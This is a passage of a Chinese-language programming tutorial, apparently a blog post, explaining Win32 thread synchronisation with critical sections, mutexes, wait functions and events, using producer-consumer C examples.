id="获取线程信息"><a href="#获取线程信息" class="headerlink" title="获取线程信息"></a>获取线程信息</h2><p>线程必须先挂起才能获取上下文，也就是上下文环境context<br>然后context内容太多，需要设立个Flag确定得到哪部分信息<br>关键代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SuspendThread(线程ID);</span><br><span class="line">CONTEXT context;</span><br><span class="line">context.ContextFlags=CONTEXT_INTEGER;</span><br><span class="line">GetThreadContext(线程ID,&amp;context);</span><br></pre></td></tr></table></figure><p>能获取就能设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1、创建CRITICAL_SECTION：</span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line"></span><br><span class="line">2、在使用前进行初始化</span><br><span class="line"></span><br><span class="line">InitializeCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、在函数中使用:</span><br><span class="line"></span><br><span class="line">DWORD WINAPI 线程A(PVOID pvParam) </span><br><span class="line">&#123;</span><br><span class="line">      EnterCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">      //对全局遍历X的操作</span><br><span class="line"></span><br><span class="line">      LeaveCriticalSection(&amp;cs);</span><br><span class="line">   return(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI 线程B(PVOID pvParam) </span><br><span class="line">&#123;</span><br><span class="line">      EnterCriticalSection(&amp;g_cs);</span><br><span class="line"></span><br><span class="line">      //对全局遍历X的操作</span><br><span class="line"></span><br><span class="line">      LeaveCriticalSection(&amp;g_cs);</span><br><span class="line">   return(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">4、删除CRITICAL_SECTION</span><br><span class="line"></span><br><span class="line">VOID DeleteCriticalSection(PCRITICAL_SECTION pcs);</span><br></pre></td></tr></table></figure><p>下面是临界区的一个使用实例，生产消费问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//临界区</span></span><br><span class="line">CRITICAL_SECTION g_cs;</span><br><span class="line"><span class="keyword">int</span> g_Max = <span class="number">10</span>;<span class="comment">//生产几个产品</span></span><br><span class="line"><span class="keyword">int</span> g_Number = <span class="number">0</span>;<span class="comment">//容器，存储产品                      </span></span><br><span class="line"><span class="comment">//生产者线程函数  </span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProduct</span><span class="params">(LPVOID pM)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g_Max; i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="comment">//互斥的访问缓冲区  </span></span><br><span class="line">        EnterCriticalSection(&amp;g_cs); </span><br><span class="line">g_Number = <span class="number">1</span>; </span><br><span class="line">DWORD id = GetCurrentThreadId();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"生产者%d将数据%d放入缓冲区\n"</span>,id, g_Number); </span><br><span class="line">        LeaveCriticalSection(&amp;g_cs); </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//消费者线程函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadConsumer</span><span class="params">(LPVOID pM)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g_Max; i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="comment">//互斥的访问缓冲区  </span></span><br><span class="line">        EnterCriticalSection(&amp;g_cs);  </span><br><span class="line">g_Number = <span class="number">0</span>; </span><br><span class="line">DWORD id = GetCurrentThreadId();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----消费者%d将数据%d放入缓冲区\n"</span>,id, g_Number); </span><br><span class="line">LeaveCriticalSection(&amp;g_cs); </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">InitializeCriticalSection(&amp;g_cs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>]; </span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">0</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProduct, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); </span><br><span class="line">hThread[<span class="number">1</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadConsumer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);  </span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);  </span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//销毁 </span></span><br><span class="line">    DeleteCriticalSection(&amp;g_cs);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当线程不再试图访问共享资源时<br>注意：要将对全局变量所有操作都放在临界区里，才是正确的</p><h1 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h1><p>上文中的临界区是在全局变量，所以只能是同一个进程同步，要使多个进程同步，临界资源就得在内核中，这就是接下来说的互斥体。   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  LPSECURITY_ATTRIBUTES lpMutexAttributes,</span><br><span class="line">  BOOL bInitialOwner,<span class="comment">//希望一创建就有信号，这里是false，</span></span><br><span class="line">  <span class="comment">//没信号互斥体就是没信号，不给信号所有线程会一直等待，</span></span><br><span class="line">  <span class="comment">//填True，如果是互斥体的拥有线程，也可以继续执行   </span></span><br><span class="line">  LPCTSTR lpName<span class="comment">//互斥体名字</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>返回值：<br>A handle to the mutex object indicates success. If the named mutex object existed before the function call, the function returns a handle to the existing object, and GetLastError returns ERROR_ALREADY_EXISTS. Otherwise, the caller created the mutex.</p><p>NULL indicates failure. To get extended error information, call GetLastError.</p><p>逻辑上的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">进程一：</span><br><span class="line"></span><br><span class="line">HANDLE g_hMutex = CreateMutex(<span class="literal">NULL</span>,FALSE, <span class="string">"XYZ"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">进程二：</span><br><span class="line"></span><br><span class="line">HANDLE g_hMutex = OpenMutex(MUTEX_ALL_ACCESS,FALSE, <span class="string">"XYZ"</span>);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(g_hMutex,INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//逻辑代码</span></span><br><span class="line"></span><br><span class="line">ReleaseMutex(g_hMutex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">进程三：</span><br><span class="line"></span><br><span class="line">HANDLE g_hMutex = OpenMutex(MUTEX_ALL_ACCESS,FALSE, <span class="string">"XYZ"</span>);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(g_hMutex,INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//逻辑代码</span></span><br><span class="line"></span><br><span class="line">ReleaseMutex(g_hMutex);</span><br></pre></td></tr></table></figure><p>下面是互斥体的生产者消费者问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//互斥体</span></span><br><span class="line">HANDLE hMutex;</span><br><span class="line"><span class="keyword">int</span> g_Max = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> g_Number = <span class="number">0</span>;                      </span><br><span class="line"><span class="comment">//生产者线程函数  </span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProduct</span><span class="params">(LPVOID pM)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g_Max; i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="comment">//互斥的访问缓冲区  </span></span><br><span class="line">        WaitForSingleObject(hMutex,INFINITE);</span><br><span class="line">g_Number = <span class="number">1</span>; </span><br><span class="line">DWORD id = GetCurrentThreadId();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"生产者%d将数据%d放入缓冲区\n"</span>,id, g_Number); </span><br><span class="line">        ReleaseMutex(hMutex);</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//消费者线程函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadConsumer</span><span class="params">(LPVOID pM)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g_Max; i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="comment">//互斥的访问缓冲区  </span></span><br><span class="line">        WaitForSingleObject(hMutex,INFINITE);</span><br><span class="line">g_Number = <span class="number">0</span>; </span><br><span class="line">DWORD id = GetCurrentThreadId();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----消费者%d将数据%d放入缓冲区\n"</span>,id, g_Number); </span><br><span class="line">ReleaseMutex(hMutex);</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建一个互斥体</span></span><br><span class="line">hMutex =  CreateMutex(<span class="literal">NULL</span>,FALSE,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>]; </span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">0</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProduct, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); </span><br><span class="line">hThread[<span class="number">1</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadConsumer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);  </span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);  </span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//销毁 </span></span><br><span class="line">    CloseHandle(hMutex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>互斥体与临界区的区别：</p><p>1、临界区只能用于单个进程间的线程控制.</p><p>2、互斥体可以设定等待超时，但临界区不能.</p><p>3、线程意外终结时，Mutex可以避免无限等待.</p><p>4、Mutex效率没有临界区高.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,        <span class="comment">// handle to object</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwMilliseconds   <span class="comment">// time-out interval</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">功能说明：</span><br><span class="line"></span><br><span class="line">等待函数可使线程自愿进入等待状态，直到一个特定的内核对象变为已通知状态为止.</span><br><span class="line"></span><br><span class="line">hHandle:</span><br><span class="line"></span><br><span class="line">内核对象句柄，可以是进程也可以是线程.</span><br><span class="line"></span><br><span class="line">dwMilliseconds:</span><br><span class="line"></span><br><span class="line">等待时间，单位是毫秒  INFINITE(<span class="number">-1</span>)一直等待</span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line"></span><br><span class="line">WAIT_OBJECT_0(<span class="number">0</span>)等待对象变为已通知</span><br><span class="line"></span><br><span class="line">WAIT_TIMEOUT(<span class="number">0x102</span>)超时</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别说明：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、内核对象中的每种对象都可以说是处于已通知或未通知的状态之中</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、这种状态的切换是由Microsoft为每个对象建立的一套规则来决定的</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、当线程正在运行的时候，线程内核对象处于未通知状态</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、当线程终止运行的时候，它就变为已通知状态</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、在内核中就是个BOOL值，运行时FALSE 结束TRUE</span><br><span class="line"></span><br><span class="line">代码演示：</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"+++++++++\n"</span>);</span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个新的线程</span></span><br><span class="line">HANDLE hThread1 = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">DWORD dwCode = ::WaitForSingleObject(hThread1, INFINITE);</span><br><span class="line"></span><br><span class="line">MessageBox(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是两个信号等待函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DWORD WaitForMultipleObjects(</span><br><span class="line">  DWORD nCount,             // number of handles in array</span><br><span class="line">  CONST HANDLE *lpHandles,  // object-handle array</span><br><span class="line">  BOOL bWaitAll,            // wait option</span><br><span class="line">  DWORD dwMilliseconds      // time-out interval</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">功能说明：</span><br><span class="line"></span><br><span class="line">同时查看若干个内核对象的已通知状态</span><br><span class="line"></span><br><span class="line">nCount：</span><br><span class="line"></span><br><span class="line">要查看内核对象的数量</span><br><span class="line"></span><br><span class="line">lpHandles：</span><br><span class="line"></span><br><span class="line">内核对象数组</span><br><span class="line"></span><br><span class="line">bWaitAll：</span><br><span class="line"></span><br><span class="line">等到类型  TRUE 等到所有变为已通知  FALSE 只要有一个变为已通知</span><br><span class="line"></span><br><span class="line">dwMilliseconds：</span><br><span class="line"></span><br><span class="line">超时时间</span><br><span class="line"></span><br><span class="line">INFINITE一直等待</span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line"></span><br><span class="line">bWaitAll为TRUE时，返回WAIT_OBJECT_0(0) 代码所以内核对象都变成已通知</span><br><span class="line"></span><br><span class="line">bWaitAll为FALSE时，返回最先变成已通知的内核对象在数组中的索引</span><br><span class="line"></span><br><span class="line">WAIT_TIMEOUT(0x102)超时</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">代码演示：</span><br><span class="line"></span><br><span class="line">DWORD WINAPI ThreadProc1(LPVOID lpParameter)</span><br><span class="line">&#123;</span><br><span class="line">for(int i=0;i&lt;5;i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;+++++++++\n&quot;);</span><br><span class="line">Sleep(1000);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI ThreadProc2(LPVOID lpParameter)</span><br><span class="line">&#123;</span><br><span class="line">for(int i=0;i&lt;3;i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;---------\n&quot;);</span><br><span class="line">Sleep(1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hArray[2];</span><br><span class="line"></span><br><span class="line">//创建一个新的线程</span><br><span class="line">HANDLE hThread1 = ::CreateThread(NULL, 0, ThreadProc1, </span><br><span class="line">NULL, 0, NULL);</span><br><span class="line"></span><br><span class="line">//创建一个新的线程</span><br><span class="line">HANDLE hThread2 = ::CreateThread(NULL, 0, ThreadProc2, </span><br><span class="line">NULL, 0, NULL);</span><br><span class="line"></span><br><span class="line">hArray[0] = hThread1;</span><br><span class="line">hArray[1] = hThread2;</span><br><span class="line"></span><br><span class="line">DWORD dwCode = ::WaitForMultipleObjects(2, hArray,FALSE,INFINITE);</span><br><span class="line"></span><br><span class="line">MessageBox(0,0,0,0);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>事件也是通知类型函数，下面是创建通知类型函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes, <span class="comment">// 安全属性 NULL时为系统默认</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL bManualReset,                      </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="comment">// 指定将事件对象创建成手动复原还是自动复原。如</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="comment">//果是TRUE，那么必须用ResetEvent函数来手工将事</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="comment">//件的状态复原到无信号状态。如果设置为FALSE，当一个等待线程被释放以后，</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="comment">//系统将会自动将事件状态复原为无信号状态。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL bInitialState,                      <span class="comment">// TRUE 已通知状态  FALSE未通知状态，有没有信号</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpName                           <span class="comment">// 对象名称 以NULL结尾的字符串</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>通知类型就是比如CreateEvent第二个项设置为true时，同步类型，只要有信号，WaitForSingleObject等到之后不会修改当前等待对象的状态，所有等待线程同时执行，false的话是互斥类型，WaitForSingleObject会修改当前等待对象的状态，有信号时只有一个能执行，剩下的是等待状态。会修改信号的状态   </p><p>注意setEvent是把自己线程挂起的意思，唤醒另一个线程，把资源让出去。   </p><p>后面是使用的示例<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>、事件对象的控制</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetEvent</span><span 